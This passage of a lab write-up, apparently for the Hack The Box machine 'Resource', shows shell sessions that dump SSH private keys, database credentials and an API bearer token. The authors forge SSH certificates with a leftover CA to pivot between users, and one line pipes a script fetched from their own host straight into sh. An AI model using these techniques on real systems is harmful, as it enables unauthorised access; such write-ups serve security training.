JngYg3umiU96dBcSZ2ZsE5YPaGuUuwAAAAMBAAEAAAGAC7cZwQSppOYRW3oV0a5ExhzS3q
SbgTgpaXhBWR7Up7nPhZC1GAvslMeInoPdmbewioooyzdu9WqUWdTsBga2zy6AbJPuuHUZ
ZVcvz6fvjwwDpbtky4mZD1kZuj/71H3Lb6CGR7z90XrZz6b+D7iXxGL4PVAtFIntE6jOzw
KwoZOXageEVz/kSsKpashL/yMZKOKVHAHmxCvAlo/D+WoS71Ab18Rl89OwPdFyRH1hxXtT
krdonz512uApWpJzBRIBO+JjqpJQKCPK3mavMd9eRy9rzAdAqNqL1JSHoGSnL3hxba2WUN
bQJcbz5tNqP11QBr/kAxpZTKBVN+MuGrihn9qYVdRY+5Kw0xOkl651KladwoSx59+p1Hdl
UpcrRpWRs04YE6wm/nlYbHrrrIz9uf/5MywxPX9k0jY3HxuigENrncqN3G4uQ+pwg6mgvW
ZVQAlKoSCg3lUCH+HnBQGFhpgwkC9/Rk6eSmH7mxXHzCBUygLolpoHCtIkBmFk/DHlAAAA
wQDf9Dc4vGGBDoEKvE+s1FE+9iZv1GstaPv/uMdMIXWa3ySjIjcXmWM6+4fK8hyiBKibkR
sVICBhlKJrfyhm/b/Jt5uWNTVt57ly2wsURlkRrbxA/j4+e2zaj86ySuF0v8Eh1dIxWE3r
QsAmrFWr1nbL/kpjOfMXogIkJdQwHd+s0Y3SZvGWPBk/jjMZWj4lvpfRQMesfb/t6G+E97
sX3ZpN/LQGTWGtCjO3CDWkzU9mvYRc+W92IudQDiXmLoW2GxIAAADBAPhDFOuMjAGpkzyJ
tZsHuPHleZKES5v/iaQir3hzywxUuv+LqUsQhsuGpRZK0IR/i+FzbeDiB/7JSAgxawZHvr
2PwsiiEjXrrTqmrMSWZawC9kmfG0/ya48C5mtpqtKJpbPmYG/Dm5umHu5AJrr6DOqOnoKC
UhUYt2eob91dvGI1eh6UBgVGacsKP9X+ciDPvFHmpMFUDq/JcJgKTbV7XfIZDQTb4SPew1
wCN2sv6FWmJmJ0uT4pSgj7m8OeKjZB1wAAAMEA7z+IaiRfJPcy5kLiZbdHQGwgnBhxRojd
0UFt4QVzoC/etjY5ah+kO8FLGiUzNSW4uu873pIdH60WYgR4XwXT/CwwRnt9FwQ7DlFmO5
LK226u0RfVdkJjo3lx04LEiYZ27JfzfFmzvTGfLDddbWMFQA3ATiKhryj0JJqxqbEBmG4m
RX3ajkx+O8cbBU4WMfQXutRVlDyV630oMPPVUrYm4SxZGJgEcq3nK6uQGPxXmAV/sMTNsm
A9QyX0p7GeHa+9AAAAEklUUkMgQ2VydGlmY2F0ZSBDQQ==
-----END OPENSSH PRIVATE KEY-----
```

```c
msainristil@itrc:~/decommission_old_ca$ cat ca-itrc.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoBD1UoFfL41g/FVX373rdm5WPz+SZ0bWt5PYP+dhok4vb3UpJPIGOeAsXmAkzEVYBHIiE+aGbrcXvDaSbZc6cI2aZfFraEPt080KVKHALAPgaOn/zFdld8P9yaENKBKltWLZ9I6rwg98IGEToB7JNZF9hzasjjD0IDKv8JQ3NwimDcZTc6Le0hJw52ANcLszteliFSyoTty9N/oUgTUjkFsgsroEh+Onz4buVD2bxoZ+9mODcdYTQ4ChwanfzFSnTrTtAQrJtyH/bDRTa2BpmdmYdQu+4HcbDl5NbiEwu1FNskz/YNDPkq3bEYEOvgMiu/0ZMy0wercx6Tn0G2cppS70/rG5GMcJi0WTcUic3k+XJ191WEG1EtXJNbZdtJc7Ky0EKhat0dgck8zpq62kejtkBQd86p6FvR8+xH3/JMxHvMNVYVODJt/MIik99sWb5Q7NCVcIXQ0ejVTzTI9QT27km/FUgl3cs5CZ4GIN7polPenQXEmdmbBOWD2hrlLs= ITRC Certifcate CA
```

We also double checked the directory of the `web application` and found a few new `credentials`.

```c
msainristil@itrc:/var/www/itrc$ ls -la
total 108
drwxr-xr-x 1 www-data www-data 4096 Feb 19 18:13 .
drwxr-xr-x 1 www-data www-data 4096 Jul 25 11:28 ..
-rw-rw-r-- 1 www-data www-data 4313 Jan 24  2024 admin.php
drwxrwxr-x 1 www-data www-data 4096 Feb 26 23:18 api
drwxrwxr-x 1 www-data www-data 4096 Jan 22  2024 assets
-rw-rw-r-- 1 www-data www-data  979 Jan 23  2024 create_ticket.php
-rw-rw-r-- 1 www-data www-data  344 Jan 24  2024 dashboard.php
-rw-rw-r-- 1 www-data www-data  308 Jan 22  2024 db.php
-rw-rw-r-- 1 www-data www-data  746 Jan 24  2024 filter.inc.php
-rw-rw-r-- 1 www-data www-data  982 Jan 24  2024 footer.inc.php
-rw-rw-r-- 1 www-data www-data 1869 Jan 24  2024 header.inc.php
-rw-rw-r-- 1 www-data www-data  844 Jan 22  2024 home.php
-rw-rw-r-- 1 www-data www-data  368 Feb 19 18:14 index.php
-rw-rw-r-- 1 www-data www-data  105 Feb 19 18:14 loggedin.php
-rw-rw-r-- 1 www-data www-data  433 Jan 23  2024 login.php
-rw-rw-r-- 1 www-data www-data   73 Jan 22  2024 logout.php
-rw-rw-r-- 1 www-data www-data  566 Jan 23  2024 register.php
-rw-rw-r-- 1 www-data www-data 2225 Feb  6 16:54 savefile.inc.php
-rw-rw-r-- 1 www-data www-data 4968 Feb  6 17:09 ticket.php
-rw-rw-r-- 1 www-data www-data 1374 Jan 24  2024 ticket_section.inc.php
drwxrwxr-x 1 www-data www-data 4096 Aug  4 06:21 uploads
```

```c
msainristil@itrc:/var/www/itrc$ cat db.php 
<?php

$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5rR5SG8uPd";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
```

| Username | Password       |
| -------- | -------------- |
| jj       | ugEG5rR5SG8uPd |

## Privilege Escalation to zzinter (Container)

After heading back to the `web application`, we used the credentials for `msainristil` to login and to get access as `admin`. This made us capable of reading all available tickets and not only displaying the `admin page` itself.

![](images/2024-08-04_09-23_80_admin_ssh_key_message_1.png)

The users talked about on how access via `SSH` to internal systems could be provided and their issues with it. That indicated what we needed to look for.

![](images/2024-08-04_09-24_80_admin_ssh_key_message_2.png)

Our member `DarkCat` nailed it quite fast. First we needed to created a `SSH key` which we then used for `signing` with the `decommissioned_old_ca` assuming that `"certificates"` signed with it would be still valid.

```c
msainristil@itrc:~$ ssh-keygen -f user_key -C "user key" -N ""
Generating public/private rsa key pair.
Your identification has been saved in user_key
Your public key has been saved in user_key.pub
The key fingerprint is:
SHA256:FRvdwZgpwVv9mm2UWgmrp9fLrn+1Qgoyxd+b30VRTKM user key
The key's randomart image is:
+---[RSA 3072]----+
|         .+o B.=o|
|          o+*.= +|
|        . o+ Eooo|
|         +.  . ++|
|        S . o o=.|
|       o . o =o.+|
|        o . = +.+|
|           o =.o+|
|            ..**+|
+----[SHA256]-----+
```

```c
msainristil@itrc:~$ ssh-keygen -s decommission_old_ca/ca-itrc -I zzinter -n zzinter -V +52w user_key.pub
Signed user key user_key-cert.pub: id "zzinter" serial 0 for zzinter valid from 2024-08-04T07:02:00 to 2025-08-03T07:03:28
```

And indeed we could `SSH` into `localhost` as `zzinter` by using our newly signed `user_key-cert.pub`.

```c
msainristil@itrc:~$ ssh -i user_key -o CertificateFile=user_key-cert.pub zzinter@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:PVHxOqGsN7oX50zMsl/3O2BPQ3u50UhffyNeJZuo2K4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

## user.txt

And with a session as `zzinter` we finally could grab the `user.txt`.

```c
zzinter@itrc:~$ cat user.txt 
bd0cce73a72ae2e49547c1a966406e7e
```

## zzinter User Pivoting (Container)

By having a quick look on the `groups` and the `home directory` of `zzinter` we found the `sign_key_api.sh` script which contained useful information for all available `signing capabilities`.

```c
zzinter@itrc:~$ id
uid=1001(zzinter) gid=1001(zzinter) groups=1001(zzinter)
```

```c
zzinter@itrc:~$ ls -la
total 32
drwx------ 1 zzinter zzinter 4096 Aug  3 19:03 .
drwxr-xr-x 1 root    root    4096 Jul 23 14:22 ..
lrwxrwxrwx 1 root    root       9 Jul 23 14:22 .bash_history -> /dev/null
-rw-r--r-- 1 zzinter zzinter  220 Mar 29 19:40 .bash_logout
-rw-r--r-- 1 zzinter zzinter 3526 Mar 29 19:40 .bashrc
-rw-r--r-- 1 zzinter zzinter  807 Mar 29 19:40 .profile
-rw-rw-r-- 1 root    root    1193 Feb 19 16:43 sign_key_api.sh
-rw-r----- 1 root    zzinter   33 Aug  3 19:02 user.txt
```

```c
zzinter@itrc:~$ cat sign_key_api.sh 
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

Since we were inside a `Docker container` we ran `deepce` for enumerating potential `Container vulnerabilities` and `Container breakouts` but since we only had `low user privileges` we couldn't do much at this point.

```c
zzinter@itrc:/$ curl 10.10.14.53/deepce.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 39417  100 39417    0     0   463k      0 --:--:-- --:--:-- --:--:--  469k

                      ##         .
                ## ## ##        ==                                               
             ## ## ## ##       ===                                               
         /"""""""""""""""""\___/ ===                                             
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~                                      
         \______ X           __/
           \    \         __/                                                    
            \____\_______/                                                                                                                                                                                                                  
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines                                                                                                                                                                                                                     

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window                                                                                                                                                                             
See https://stealthcopter.github.io/deepce                                                                                                                                                                                                  

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... zzinter
[+] Groups .................. zzinter
[+] Sudo .................... sudo not found
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
[+] Docker Version .......... Version Unknown
==================================( Enumerating Container )===================================
[+] Container ID ............ itrc
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.223.0.3 
[+] DNS Server(s) ........... 127.0.0.11 
[+] Host IP ................. 172.223.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 5.15.0-117-generic
[+] Arch .................... x86_64
[+] CPU ..................... AMD EPYC 7513 32-Core Processor
[+] Useful tools installed .. Yes
/usr/bin/curl
/usr/bin/wget                                                                                                                                                                                                                               
/usr/bin/gcc                                                                                                                                                                                                                                
/usr/bin/hostname                                                                                                                                                                                                                           
[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
libcap2-bin is required but not installed
apt install -y libcap2-bin

Current capabilities are:
CapInh: 0000000000000000
CapPrm: 0000000000000000                                                                                                                                                                                                                    
CapEff: 0000000000000000                                                                                                                                                                                                                    
CapBnd: 00000000a80425fb                                                                                                                                                                                                                    
CapAmb: 0000000000000000                                                                                                                                                                                                                    
> This can be decoded with: "capsh --decode=0000000000000000"
[+] SSHD Service ............ Yes (port 22)
[+] Privileged Mode ......... Unknown
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. Yes
/var/snap/docker/common/var-lib-docker/containers/ef9c878c88f2b801920187028f0d536d2610efedd09aab83b7eeccedb9150c55/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
/var/snap/docker/common/var-lib-docker/containers/ef9c878c88f2b801920187028f0d536d2610efedd09aab83b7eeccedb9150c55/hostname /etc/hostname rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw                                           
/var/snap/docker/common/var-lib-docker/containers/ef9c878c88f2b801920187028f0d536d2610efedd09aab83b7eeccedb9150c55/hosts /etc/hosts rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw                                                 
[+] Possible host usernames ...  
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... Yes
-rwxrwxr-x 1 root root 49 Jan 24  2024 /opt/startup.sh
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... total 8.0K
drwx------ 1 msainristil msainristil 4.0K Aug  4 07:03 msainristil                                                                                                                                                                          
drwx------ 1 zzinter     zzinter     4.0K Aug  4 08:37 zzinter                                                                                                                                                                              
[+] Hashes in shadow file ............... Not readable
[+] Searching for app dirs .............. 
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further                                                                                                                                                                                         

[+] Attempting ping sweep of 172.223.0.3 /24 (ping) 
172.223.0.1 is Up
172.223.0.2 is Up
172.223.0.3 is Up
==============================================================================================
```

## Privilege Escalation to support (Host)

Escaping the `container` was a dead end at this point so we headed back to the `sign_key_api.sh` script and created another certificate for the `support` user mentioned in it.

```c
zzinter@itrc:~$ ssh-keygen -f foobar
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in foobar
Your public key has been saved in foobar.pub
The key fingerprint is:
SHA256:/q0jSanJP2tg8bOjTwRwSWb+ltyyJo6nGuz65s+VUcQ zzinter@itrc
The key's randomart image is:
+---[RSA 3072]----+
|    ..=o.        |
|     *..E        |
|      o .        |
|      .= o       |
|      .oS..      |
| .    o*=o       |
|  o  o+==+       |
| ..o +=+B...     |
|.==o=oo=+=oo.    |
+----[SHA256]-----+
```

```c
zzinter@itrc:~$ /bin/bash sign_key_api.sh foobar.pub support support > foobar.cert
```

We downloaded all of the files to access the box on port `2222/TCP` with it from our local machine.

```c
zzinter@itrc:~$ cat foobar
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```c
zzinter@itrc:~$ cat foobar.cert 
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgq4+Kz2SZbzvinn6vaP09ZKWL9pwtO2QfD8EBjUkFt/0AAAADAQABAAABgQDOnDqhA2ly5fZjHdvuO8cvXzM2sQpbw6OBHZyS8BtCr5e3ckMk0RTb3CpnLw6eS3XyCW1qeSlnUG/+dgz16VgcWWm4gQOIwWTpFDvHSA2OKYTzGTzzfRR/Fi4iddeOJL5CooL5nQefvstQCpHU24108JFSMEYNalL/I1B9uqVb7vARYcrxx8ceyFW3ajk29BvJDbMhaM2V9GUCw1K36tmemM2FrCNs9Vd8lUVNBzdC2ZBv9S0xrlQKozr4Q+cPF/4ePBSEriUGn9/+FRXzkjr3RSNwPSJBO7G0bXXSnEd5Wac1ahm+FQNiDTbbsm+CgCc8Cwqzi36f/rvPxmlCA3lCSCvsVRa3NEpEK+a8tKRsT4bynmoa+oHDRxMLKr8KE72fewRk7lCFxoNX8VutGobE+E25HddAfAlw0atLS5Bu8qLk02SGiGREscs4JYO/cKPQEbmVvZ+1Dsh1gjZBySstF7hu3nHwsLS8CQdtZoqPVb2suHbKNS6j1cVy3ehnVxMAAAAAAAAAJwAAAAEAAAAHc3VwcG9ydAAAAAsAAAAHc3VwcG9ydAAAAABmpgFT//////////8AAAAAAAAAggAAABVwZXJtaXQtWDExLWZvcndhcmRpbmcAAAAAAAAAF3Blcm1pdC1hZ2VudC1mb3J3YXJkaW5nAAAAAAAAABZwZXJtaXQtcG9ydC1mb3J3YXJkaW5nAAAAAAAAAApwZXJtaXQtcHR5AAAAAAAAAA5wZXJtaXQtdXNlci1yYwAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAFMAAAALc3NoLWVkMjU1MTkAAABA+C9M9JoN/rWRnTBypbDQuRs05u/IMMkfbs0DGzc98U9nL2mBtJt8jOmXBx2n2qxACFs2Shf0wVIKiTZxp1y5DQ== zzinter@itrc
```

```c
zzinter@itrc:~$ cat foobar.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOnDqhA2ly5fZjHdvuO8cvXzM2sQpbw6OBHZyS8BtCr5e3ckMk0RTb3CpnLw6eS3XyCW1qeSlnUG/+dgz16VgcWWm4gQOIwWTpFDvHSA2OKYTzGTzzfRR/Fi4iddeOJL5CooL5nQefvstQCpHU24108JFSMEYNalL/I1B9uqVb7vARYcrxx8ceyFW3ajk29BvJDbMhaM2V9GUCw1K36tmemM2FrCNs9Vd8lUVNBzdC2ZBv9S0xrlQKozr4Q+cPF/4ePBSEriUGn9/+FRXzkjr3RSNwPSJBO7G0bXXSnEd5Wac1ahm+FQNiDTbbsm+CgCc8Cwqzi36f/rvPxmlCA3lCSCvsVRa3NEpEK+a8tKRsT4bynmoa+oHDRxMLKr8KE72fewRk7lCFxoNX8VutGobE+E25HddAfAlw0atLS5Bu8qLk02SGiGREscs4JYO/cKPQEbmVvZ+1Dsh1gjZBySstF7hu3nHwsLS8CQdtZoqPVb2suHbKNS6j1cVy3ehnVxM= zzinter@itrc
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/files]
└─$ chmod 600 foobar
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/files]
└─$ ssh -p 2222 -i foobar -o CertificateFile=foobar.cert support@10.129.251.225
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Aug  4 08:32:38 AM UTC 2024

  System load:           0.0
  Usage of /:            74.9% of 10.73GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             246
  Users logged in:       0
  IPv4 address for eth0: 10.129.251.225
  IPv6 address for eth0: dead:beef::250:56ff:fe94:d0b2


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Thu Jul 25 12:49:09 2024 from 10.10.14.23
support@ssg:~$
```

## support User Pivoting (Host)

We performed all the typical enumeration steps with the new user and found `authentication principals` inside the `/etc/ssh/auth_principals` directory which we tbh ignored for far too long.

```c
support@ssg:~$ id
uid=1000(support) gid=1000(support) groups=1000(support)
```

```c
support@ssg:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
support:x:1000:1000:support:/home/support:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
zzinter:x:1001:1001::/home/zzinter:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

```c
support@ssg:~$ ls -la
total 28
drwxr-x--- 4 support support 4096 Jun 21 18:11 .
drwxr-xr-x 4 root    root    4096 Jul 23 13:44 ..
lrwxrwxrwx 1 root    root       9 Jun 21 18:11 .bash_history -> /dev/null
-rw-r--r-- 1 support support  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 support support 3771 Jan  6  2022 .bashrc
drwx------ 2 support support 4096 Feb  7 19:43 .cache
-rw-r--r-- 1 support support  807 Jan  6  2022 .profile
drwx------ 2 support support 4096 Feb  7 19:37 .ssh
```

```c
support@ssg:/opt$ ls -la
total 16
drwxr-xr-x  3 root root    4096 Jul 23 14:03 .
drwxr-xr-x 19 root root    4096 Jul 24 11:54 ..
-rwxr-----  1 root zzinter 1480 Jul 23 14:02 sign_key.sh
drwx------  4 root root    4096 Feb  8 19:05 signserv
```

```c
support@ssg:/etc/ssh/auth_principals$ ls -la
total 20
drwxr-xr-x 2 root root 4096 Feb  8 12:16 .
drwxr-xr-x 5 root root 4096 Jul 24 12:24 ..
-rw-r--r-- 1 root root   10 Feb  8 12:16 root
-rw-r--r-- 1 root root   18 Feb  8 12:16 support
-rw-r--r-- 1 root root   13 Feb  8 12:11 zzinter
```

At some point `DarkCat` came in clutch and read the actual content of the files inside `auth_principals`. The most facepalm moment in a long time.

```c
support@ssg:/etc/ssh/auth_principals$ cat zzinter 
zzinter_temp
```

## Privilege Escalation to zzinter (Host)

Now knowing that `zzinter` had a different `authentication principals` brought us back the `sign_key_api.sh` script.

```c
zzinter@itrc:~$ cat sign_key_api.sh 
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
